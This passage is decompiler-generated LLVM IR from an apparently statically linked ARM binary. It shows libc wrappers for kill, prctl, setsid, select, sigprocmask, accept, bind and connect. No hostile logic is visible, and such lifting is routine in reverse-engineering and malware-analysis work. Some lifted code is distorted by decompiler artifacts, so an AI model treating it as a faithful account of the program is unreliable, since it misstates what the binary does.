dec_label_pc_fee0:                                ; preds = %dec_label_pc_fea0, %dec_label_pc_fec8
  %v0_fee4 = phi i32 [ %v0_feb0, %dec_label_pc_fea0 ], [ -1, %dec_label_pc_fec8 ]
  %v0_fee0 = phi i32 [ %v0_fea0, %dec_label_pc_fea0 ], [ %v0_fee0.pre, %dec_label_pc_fec8 ]
  store i32 %v0_fee0, i32* %r0.global-to-local, align 4
  store i32 %v0_fee4, i32* @r7, align 4
  %v1_fee8 = call i32 @__libc_disable_asynccancel(i32 %v0_fee0)
  store i32 %v1_fee8, i32* %r0.global-to-local, align 4
  %v0_feec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_feec

dec_label_pc_feec:                                ; preds = %dec_label_pc_fe98, %dec_label_pc_fee0
  %v0_feec = phi i32 [ %v0_fe98, %dec_label_pc_fe98 ], [ %v0_feec.pre, %dec_label_pc_fee0 ]
  store i32 %v0_feec, i32* %r0.global-to-local, align 4
  %v2_fef4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fef4, i32* @r4, align 4
  store i32 %v6_fe34, i32* @r5, align 4
  store i32 %v12_fe34, i32* @r7, align 4
  ret i32 %v0_feec

; uselistorder directives
  uselistorder i32 %v0_feec, { 1, 0 }
  uselistorder i32 %v0_fee0, { 1, 0 }
  uselistorder i32 %v0_feb0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_fe58, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_feec, { 1, 0 }
  uselistorder label %dec_label_pc_fee0, { 1, 0 }
  uselistorder label %dec_label_pc_fe98, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ff10 = load i32, i32* @r7, align 4
  store i32 %v3_ff10, i32* %stack_var_-8, align 4
  %v0_ff1c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff1c, -4095
  br i1 %tmp, label %dec_label_pc_ff3c, label %dec_label_pc_ff24

dec_label_pc_ff24:                                ; preds = %entry
  %v1_ff28 = sub i32 0, %v0_ff1c
  %v3_ff2c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_ff2c = sext i16 %v3_ff2c to i32
  %v0_ff30 = call i32 @__aeabi_read_tp()
  %v3_ff34 = add i32 %v4_ff2c, %v0_ff30
  %v4_ff34 = inttoptr i32 %v3_ff34 to i32*
  store i32 %v1_ff28, i32* %v4_ff34, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %entry, %dec_label_pc_ff24
  %v1_ff40 = phi i32 [ %v0_ff1c, %entry ], [ -1, %dec_label_pc_ff24 ]
  %v2_ff3c = phi i32 [ %v3_ff10, %entry ], [ %v2_ff3c.pre, %dec_label_pc_ff24 ]
  store i32 %v2_ff3c, i32* @r7, align 4
  ret i32 %v1_ff40

; uselistorder directives
  uselistorder i32 %v0_ff1c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff3c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ff48 = load i32, i32* @r4, align 4
  store i32 %v3_ff48, i32* %stack_var_-12, align 4
  %v0_ff58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ff58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff58, -4095
  br i1 %tmp, label %dec_label_pc_ff80, label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %entry
  %v0_ff6c = call i32 @__aeabi_read_tp()
  %v3_ff70 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_ff70 = sext i16 %v3_ff70 to i32
  %v0_ff74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff74 = sub i32 0, %v0_ff74
  store i32 %v1_ff74, i32* %r2.global-to-local, align 4
  %v3_ff78 = add i32 %v4_ff70, %v0_ff6c
  %v4_ff78 = inttoptr i32 %v3_ff78 to i32*
  store i32 %v1_ff74, i32* %v4_ff78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff80.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %entry, %dec_label_pc_ff68
  %v1_ff84 = phi i32 [ %v0_ff58, %entry ], [ -1, %dec_label_pc_ff68 ]
  %v2_ff80 = phi i32 [ %v3_ff48, %entry ], [ %v2_ff80.pre, %dec_label_pc_ff68 ]
  store i32 %v2_ff80, i32* @r4, align 4
  ret i32 %v1_ff84

; uselistorder directives
  uselistorder i32 %v0_ff58, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff80, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ff8c = load i32, i32* @r4, align 4
  store i32 %v3_ff8c, i32* %stack_var_-12, align 4
  %v0_ff9c = load i32, i32* @r0, align 4
  store i32 %v0_ff9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff9c, -4095
  br i1 %tmp, label %dec_label_pc_ffc4, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %entry
  %v0_ffb0 = call i32 @__aeabi_read_tp()
  %v3_ffb4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_ffb4 = sext i16 %v3_ffb4 to i32
  %v0_ffb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ffb8 = sub i32 0, %v0_ffb8
  store i32 %v1_ffb8, i32* %r2.global-to-local, align 4
  %v3_ffbc = add i32 %v4_ffb4, %v0_ffb0
  %v4_ffbc = inttoptr i32 %v3_ffbc to i32*
  store i32 %v1_ffb8, i32* %v4_ffbc, align 4
  %v2_ffc4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ffc4

dec_label_pc_ffc4:                                ; preds = %entry, %dec_label_pc_ffac
  %v1_ffc8 = phi i32 [ %v0_ff9c, %entry ], [ -1, %dec_label_pc_ffac ]
  %v2_ffc4 = phi i32 [ %v3_ff8c, %entry ], [ %v2_ffc4.pre, %dec_label_pc_ffac ]
  store i32 %v2_ffc4, i32* @r4, align 4
  ret i32 %v1_ffc8

; uselistorder directives
  uselistorder i32 %v0_ff9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffc4, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ffd0 = load i32, i32* @r4, align 4
  store i32 %v3_ffd0, i32* %stack_var_-28, align 4
  %v6_ffd0 = load i32, i32* @r5, align 4
  %v9_ffd0 = load i32, i32* @r6, align 4
  %v12_ffd0 = load i32, i32* @r7, align 4
  %v15_ffd0 = load i32, i32* @r8, align 4
  %v18_ffd0 = load i32, i32* @sl, align 4
  %v21_ffd0 = load i32, i32* @lr, align 4
  %v4_ffe0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_ffe8 = icmp eq i32 %v4_ffe0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_ffe8, label %dec_label_pc_10004, label %entry.dec_label_pc_10010_crit_edge

entry.dec_label_pc_10010_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10010

dec_label_pc_10004:                               ; preds = %entry
  store i32 %v3_ffd0, i32* @r4, align 4
  store i32 %v9_ffd0, i32* @r6, align 4
  store i32 %v12_ffd0, i32* @r7, align 4
  store i32 %v15_ffd0, i32* @r8, align 4
  store i32 %v18_ffd0, i32* %sl.global-to-local, align 4
  %v0_1000c = call i32 @__syscall_select()
  br label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %entry.dec_label_pc_10010_crit_edge, %dec_label_pc_10004
  %v0_10010 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10010, i32* @r5, align 4
  %v0_10024 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10024, i32* @r0, align 4
  %v0_1002c = call i32 @__syscall_select()
  store i32 %v0_1002c, i32* @r4, align 4
  %v0_10034 = load i32, i32* @r5, align 4
  %v1_10038 = call i32 @__libc_disable_asynccancel(i32 %v0_10034)
  %v0_1003c = load i32, i32* @r4, align 4
  %v2_10044 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10044, i32* @r4, align 4
  store i32 %v6_ffd0, i32* @r5, align 4
  store i32 %v9_ffd0, i32* @r6, align 4
  store i32 %v12_ffd0, i32* @r7, align 4
  store i32 %v15_ffd0, i32* @r8, align 4
  store i32 %v18_ffd0, i32* @sl, align 4
  store i32 %v21_ffd0, i32* @lr, align 4
  ret i32 %v0_1003c

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10054 = load i32, i32* @r7, align 4
  store i32 %v3_10054, i32* %stack_var_-8, align 4
  %v0_10060 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10060, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10060, -4095
  br i1 %tmp, label %dec_label_pc_10088, label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %entry
  %v0_10074 = call i32 @__aeabi_read_tp()
  %v3_10078 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10078 = sext i16 %v3_10078 to i32
  %v0_1007c = load i32, i32* %r2.global-to-local, align 4
  %v1_1007c = sub i32 0, %v0_1007c
  store i32 %v1_1007c, i32* %r2.global-to-local, align 4
  %v3_10080 = add i32 %v4_10078, %v0_10074
  %v4_10080 = inttoptr i32 %v3_10080 to i32*
  store i32 %v1_1007c, i32* %v4_10080, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10088.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %entry, %dec_label_pc_10070
  %v1_1008c = phi i32 [ %v0_10060, %entry ], [ -1, %dec_label_pc_10070 ]
  %v2_10088 = phi i32 [ %v3_10054, %entry ], [ %v2_10088.pre, %dec_label_pc_10070 ]
  store i32 %v2_10088, i32* @r7, align 4
  ret i32 %v1_1008c

; uselistorder directives
  uselistorder i32 %v0_10060, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10088, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10098 = icmp eq i32* %arg2, null
  br i1 %v2_10098, label %dec_label_pc_100dc, label %dec_label_pc_100ac

dec_label_pc_100ac:                               ; preds = %entry
  %v2_100ac = load i32, i32* %arg2, align 4
  %v1_100b0 = icmp slt i32 %v2_100ac, 0
  br i1 %v1_100b0, label %dec_label_pc_100c4, label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_100ac
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_100b8 = load i32, i32* %.pre3, align 4
  %v1_100bc = urem i32 %v3_100b8, 2
  %v2_100bc = icmp eq i32 %v1_100bc, 0
  br i1 %v2_100bc, label %dec_label_pc_100dc, label %dec_label_pc_100c4

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100ac, %dec_label_pc_100b8
  %v2_100c4 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_100c4 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100b8, %entry, %dec_label_pc_100c4
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10110, label %dec_label_pc_100f8

dec_label_pc_100f8:                               ; preds = %dec_label_pc_100dc
  %v1_100fc = sub i32 0, %arg1
  %v3_10100 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10100 = sext i16 %v3_10100 to i32
  %v0_10104 = call i32 @__aeabi_read_tp()
  %v3_10108 = add i32 %v4_10100, %v0_10104
  %v4_10108 = inttoptr i32 %v3_10108 to i32*
  store i32 %v1_100fc, i32* %v4_10108, align 4
  br label %dec_label_pc_10110

dec_label_pc_10110:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_100f8
  %v1_10118 = phi i32 [ %arg1, %dec_label_pc_100dc ], [ -1, %dec_label_pc_100f8 ]
  ret i32 %v1_10118

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10110, { 1, 0 }
  uselistorder label %dec_label_pc_100dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100c4, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10124 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10134 = call i32 @gettimeofday(i32 %v2_10124, i32 0)
  %v2_10138 = load i32, i32* %stack_var_-16, align 4
  %v2_1013c = icmp eq i32* %arg1, null
  br i1 %v2_1013c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10138, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10138

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_10150 = load i32, i32* @lr, align 4
  %v0_10158 = call i32 @__aeabi_read_tp()
  %v3_1015c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_1015c = sext i16 %v3_1015c to i32
  %v2_10160 = add i32 %v4_1015c, %v0_10158
  store i32 %v0_10150, i32* @lr, align 4
  ret i32 %v2_10160
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_10174 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10174, i32* @r0, align 4
  %v1_1017c = call i32 @times(i32 %v2_10174)
  %v2_10180 = load i32, i32* %stack_var_-24, align 4
  %v2_10184 = add i32 %v2_10180, %tmp
  %v2_1018c = mul i32 %v2_10184, 10000
  %v1_10190 = and i32 %v2_1018c, 2147483632
  ret i32 %v1_10190

; uselistorder directives
  uselistorder i32 %v2_10174, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_101b0 = call i32 @_memcpy()
  ret i32 %v0_101b0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_101c0 = call i32 @_memcpy()
  ret i32 %v0_101c0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_101e01 = load i32, i32* @r1, align 4
  %v1_101e02 = inttoptr i32 %v0_101e01 to i8*
  %v2_101e03 = load i8, i8* %v1_101e02, align 1
  %v2_101e45 = icmp eq i8 %v2_101e03, 0
  store i1 %v2_101e45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_101e03, i8* %arg1, align 1
  br i1 %v2_101e45, label %dec_label_pc_101f0, label %dec_label_pc_101d8

dec_label_pc_101d8:                               ; preds = %entry, %dec_label_pc_101d8
  %v0_101d8 = load i32, i32* @r1, align 4
  %v1_101d8 = add i32 %v0_101d8, 1
  store i32 %v1_101d8, i32* @r1, align 4
  %v0_101dc = load i32, i32* %r2.global-to-local, align 4
  %v1_101dc = add i32 %v0_101dc, 1
  store i32 %v1_101dc, i32* %r2.global-to-local, align 4
  %v1_101e0 = inttoptr i32 %v1_101d8 to i8*
  %v2_101e0 = load i8, i8* %v1_101e0, align 1
  %v2_101e4 = icmp eq i8 %v2_101e0, 0
  store i1 %v2_101e4, i1* %cpsr_z.global-to-local, align 1
  %v3_101e8 = inttoptr i32 %v1_101dc to i8*
  store i8 %v2_101e0, i8* %v3_101e8, align 1
  %v0_101ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101ec, label %dec_label_pc_101f0, label %dec_label_pc_101d8

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101d8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_101d8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_101fc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_101fc, i32* @r1, align 4
  %v0_10200 = call i32 @inet_aton()
  %v2_10204 = icmp eq i32 %v0_10200, 0
  %v4_10208 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_10204, i32 -1, i32 %v4_10208
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1021c = load i32, i32* @r7, align 4
  store i32 %v3_1021c, i32* %stack_var_-8, align 4
  %v0_10228 = load i32, i32* @r0, align 4
  store i32 %v0_10228, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10228, -4095
  br i1 %tmp, label %dec_label_pc_10250, label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %entry
  %v0_1023c = call i32 @__aeabi_read_tp()
  %v3_10240 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10240 = sext i16 %v3_10240 to i32
  %v0_10244 = load i32, i32* %r2.global-to-local, align 4
  %v1_10244 = sub i32 0, %v0_10244
  store i32 %v1_10244, i32* %r2.global-to-local, align 4
  %v3_10248 = add i32 %v4_10240, %v0_1023c
  %v4_10248 = inttoptr i32 %v3_10248 to i32*
  store i32 %v1_10244, i32* %v4_10248, align 4
  %v2_10250.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %entry, %dec_label_pc_10238
  %v1_10254 = phi i32 [ %v0_10228, %entry ], [ -1, %dec_label_pc_10238 ]
  %v2_10250 = phi i32 [ %v3_1021c, %entry ], [ %v2_10250.pre, %dec_label_pc_10238 ]
  store i32 %v2_10250, i32* @r7, align 4
  ret i32 %v1_10254

; uselistorder directives
  uselistorder i32 %v0_10228, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10250, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10258:
  %v0_10258 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10258, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10258
  %v2_1025c = load i32, i32* @r4, align 4
  %v5_1025c = udiv i32 %v2_1025c, 4194304
  %v6_1025c = and i32 %v5_1025c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10258, %bb
  %v7_1025c = phi i32 [ %arg1, %dec_label_pc_10258 ], [ %v6_1025c, %bb ]
  ret i32 %v7_1025c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10264 = load i32, i32* @r4, align 4
  store i32 %v3_10264, i32* %stack_var_-20, align 4
  %v6_10264 = load i32, i32* @r5, align 4
  %v9_10264 = load i32, i32* @r6, align 4
  %v12_10264 = load i32, i32* @r7, align 4
  %v4_10270 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_10274 = icmp eq i32 %v4_10270, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_10274, label %dec_label_pc_1028c, label %entry.dec_label_pc_10298_crit_edge

entry.dec_label_pc_10298_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10298

dec_label_pc_1028c:                               ; preds = %entry
  store i32 %v3_10264, i32* @r4, align 4
  store i32 %v9_10264, i32* @r6, align 4
  store i32 %v12_10264, i32* @r7, align 4
  %v0_10294 = call i32 @__sys_accept()
  br label %dec_label_pc_10298

dec_label_pc_10298:                               ; preds = %entry.dec_label_pc_10298_crit_edge, %dec_label_pc_1028c
  %v0_10298 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10298, i32* @r5, align 4
  %v0_102a8 = load i32, i32* @r4, align 4
  store i32 %v0_102a8, i32* @r0, align 4
  %v0_102ac = call i32 @__sys_accept()
  store i32 %v0_102ac, i32* @r4, align 4
  %v0_102b4 = load i32, i32* @r5, align 4
  %v1_102b8 = call i32 @__libc_disable_asynccancel(i32 %v0_102b4)
  %v0_102bc = load i32, i32* @r4, align 4
  %v2_102c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_102c4, i32* @r4, align 4
  store i32 %v6_10264, i32* @r5, align 4
  store i32 %v9_10264, i32* @r6, align 4
  store i32 %v12_10264, i32* @r7, align 4
  ret i32 %v0_102bc

; uselistorder directives
  uselistorder label %dec_label_pc_10298, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102d4 = load i32, i32* @r7, align 4
  store i32 %v3_102d4, i32* %stack_var_-8, align 4
  %v0_102e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102e0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_102e0, -4095
  br i1 %tmp, label %dec_label_pc_10308, label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %entry
  %v0_102f4 = call i32 @__aeabi_read_tp()
  %v3_102f8 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_102f8 = sext i16 %v3_102f8 to i32
  %v0_102fc = load i32, i32* %r2.global-to-local, align 4
  %v1_102fc = sub i32 0, %v0_102fc
  store i32 %v1_102fc, i32* %r2.global-to-local, align 4
  %v3_10300 = add i32 %v4_102f8, %v0_102f4
  %v4_10300 = inttoptr i32 %v3_10300 to i32*
  store i32 %v1_102fc, i32* %v4_10300, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10308.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10308

dec_label_pc_10308:                               ; preds = %entry, %dec_label_pc_102f0
  %v1_1030c = phi i32 [ %v0_102e0, %entry ], [ -1, %dec_label_pc_102f0 ]
  %v2_10308 = phi i32 [ %v3_102d4, %entry ], [ %v2_10308.pre, %dec_label_pc_102f0 ]
  store i32 %v2_10308, i32* @r7, align 4
  ret i32 %v1_1030c

; uselistorder directives
  uselistorder i32 %v0_102e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10308, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10310:
  %v0_10310 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10310, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10310
  %v2_10314 = load i32, i32* @ip, align 4
  %v3_10314 = udiv i32 %v2_10314, 1048576
  %v4_10314 = mul i32 %v2_10314, 4096
  %v5_10314 = or i32 %v3_10314, %v4_10314
  %v8_10314 = and i32 %v5_10314, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10310, %bb
  %v9_10314 = phi i32 [ %arg1, %dec_label_pc_10310 ], [ %v8_10314, %bb ]
  ret i32 %v9_10314

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10318 = load i32, i32* @r7, align 4
  store i32 %v3_10318, i32* %stack_var_-8, align 4
  %v0_10324 = load i32, i32* @r0, align 4
  store i32 %v0_10324, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10324, -4095
  br i1 %tmp, label %dec_label_pc_1034c, label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %entry
  %v0_10338 = call i32 @__aeabi_read_tp()
  %v3_1033c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_1033c = sext i16 %v3_1033c to i32
  store i32 %v4_1033c, i32* @r3, align 4
  %v0_10340 = load i32, i32* %r2.global-to-local, align 4
  %v1_10340 = sub i32 0, %v0_10340
  store i32 %v1_10340, i32* %r2.global-to-local, align 4
  %v3_10344 = add i32 %v4_1033c, %v0_10338
  %v4_10344 = inttoptr i32 %v3_10344 to i32*
  store i32 %v1_10340, i32* %v4_10344, align 4
  %v2_1034c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %entry, %dec_label_pc_10334
  %v1_10350 = phi i32 [ %v0_10324, %entry ], [ -1, %dec_label_pc_10334 ]
  %v2_1034c = phi i32 [ %v3_10318, %entry ], [ %v2_1034c.pre, %dec_label_pc_10334 ]
  store i32 %v2_1034c, i32* @r7, align 4
  ret i32 %v1_10350

; uselistorder directives
  uselistorder i32 %v0_10324, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1034c, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10354:
  %v0_10354 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10354, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10354
  %v2_10358 = load i32, i32* @r8, align 4
  %v5_10358 = udiv i32 %v2_10358, 1048576
  %v6_10358 = and i32 %v5_10358, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10354, %bb
  %v7_10358 = phi i32 [ %arg1, %dec_label_pc_10354 ], [ %v6_10358, %bb ]
  ret i32 %v7_10358

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10360 = load i32, i32* @r4, align 4
  store i32 %v3_10360, i32* %stack_var_-20, align 4
  %v6_10360 = load i32, i32* @r5, align 4
  %v9_10360 = load i32, i32* @r6, align 4
  %v12_10360 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r3, align 4
  %v4_1036c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  store i32 %v4_1036c, i32* @ip, align 4
  %v2_10370 = icmp eq i32 %v4_1036c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_10370, label %dec_label_pc_10388, label %entry.dec_label_pc_10394_crit_edge

entry.dec_label_pc_10394_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10394

dec_label_pc_10388:                               ; preds = %entry
  store i32 %v3_10360, i32* @r4, align 4
  store i32 %v9_10360, i32* @r6, align 4
  store i32 %v12_10360, i32* @r7, align 4
  %v0_10390 = call i32 @__sys_connect()
  br label %dec_label_pc_10394

dec_label_pc_10394:                               ; preds = %entry.dec_label_pc_10394_crit_edge, %dec_label_pc_10388
  %v0_10394 = call i32 @__libc_enable_asynccancel()
  %v0_10398 = load i32, i32* @r6, align 4
  store i32 %v0_10398, i32* @r1, align 4
  store i32 %v0_10394, i32* @r5, align 4
  %v0_103a4 = load i32, i32* @r4, align 4
  store i32 %v0_103a4, i32* @r0, align 4
  %v0_103a8 = call i32 @__sys_connect()
  store i32 %v0_103a8, i32* @r4, align 4
  %v0_103b0 = load i32, i32* @r5, align 4
  %v1_103b4 = call i32 @__libc_disable_asynccancel(i32 %v0_103b0)
  %v0_103b8 = load i32, i32* @r4, align 4
